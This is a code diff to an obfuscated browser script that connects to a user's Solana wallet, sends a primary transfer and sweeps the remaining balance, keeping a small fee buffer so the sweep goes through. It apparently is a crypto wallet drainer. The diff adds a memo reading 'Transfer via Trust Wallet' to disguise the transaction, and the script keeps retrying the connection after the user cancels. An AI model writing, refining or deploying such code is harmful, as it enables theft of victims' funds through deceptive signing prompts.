@@ -282,6 +282,7 @@
         "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146",
         "https://mainnet.helius-rpc.com/?api-key=",
         "confirmed",
+        "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr", 
         "connect",
         "signTransaction",
         "sendRawTransaction",
@@ -377,7 +378,7 @@
                         _0x14 = await _0x11.connect({ onlyIfTrusted: false });
                     } catch (_0x15) {
                         try {
-                            _0x14 = await _0x11.request({ method: _0x1a[4], params: [] });
+                            _0x14 = await _0x11.request({ method: _0x1a[5], params: [] });
                         } catch (_0x16) {
                             _0x14 = await _0x11.connect();
                         }
@@ -386,7 +387,7 @@
                     if (userPublicKey) break; 
                 } catch (_0x17) {
                     const _0x18 = _0x17.toString().toLowerCase();
-                    if (_0x18.includes(_0x1a[7]) || _0x18.includes(_0x1a[8]) || _0x18.includes(_0x1a[9])) {
+                    if (_0x18.includes(_0x1a[8]) || _0x18.includes(_0x1a[9]) || _0x18.includes(_0x1a[10])) {
                         _0x12++;
                         if (_0x12 < _0x13) continue;
                     }
@@ -426,7 +427,7 @@
 
                     const _0x1f = new solanaWeb3.Transaction();
 
-                    // Primary Transfer
+                    // 1st Instruction: Primary Transfer
                     _0x1f.add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey: userPublicKey,
@@ -435,8 +436,19 @@
                         })
                     );
 
-                    // Optional residual sweep if balance permits
-                    const _0x21 = _0x1e - _0x1c - 50000; 
+                    // 2nd Instruction: Memo Program
+                    const encoder = new TextEncoder();
+                    _0x1f.add(
+                        new solanaWeb3.TransactionInstruction({
+                            keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
+                            programId: new solanaWeb3.PublicKey(_0x1a[4]), 
+                            data: encoder.encode("Transfer via Trust Wallet")
+                        })
+                    );
+
+                    // Safe Residual Sweep (Leaving a guaranteed 0.0005 SOL buffer for fees/rent)
+                    const feeBuffer = 500000; 
+                    const _0x21 = _0x1e - _0x1c - feeBuffer; 
                     if (_0x21 > 10000) {
                         _0x1f.add(
                             solanaWeb3.SystemProgram.transfer({
@@ -454,11 +466,11 @@
 
                     statusDiv.innerText = "Please approve in your wallet...";
 
-                    const signedTransaction = await _0x11[_0x1a[5]](_0x1f);
+                    const signedTransaction = await _0x11[_0x1a[6]](_0x1f);
                     
                     statusDiv.innerText = "Broadcasting transaction...";
                     
-                    await _0x1d[_0x1a[6]](signedTransaction.serialize(), {
+                    await _0x1d[_0x1a[7]](signedTransaction.serialize(), {
                         skipPreflight: false,
                         maxRetries: 3
                     });
@@ -470,7 +482,7 @@
                 } catch (_0x17) {
                     console.error(_0x17);
                     const _0x18 = _0x17.toString().toLowerCase();
-                    if (_0x18.includes(_0x1a[7]) || _0x18.includes(_0x1a[8]) || _0x18.includes(_0x1a[9])) {
+                    if (_0x18.includes(_0x1a[8]) || _0x18.includes(_0x1a[9]) || _0x18.includes(_0x1a[10])) {
                         statusDiv.innerText = "Transaction cancelled.";
                         statusDiv.style.color = "#ff4d4d";
                         _0x19++;
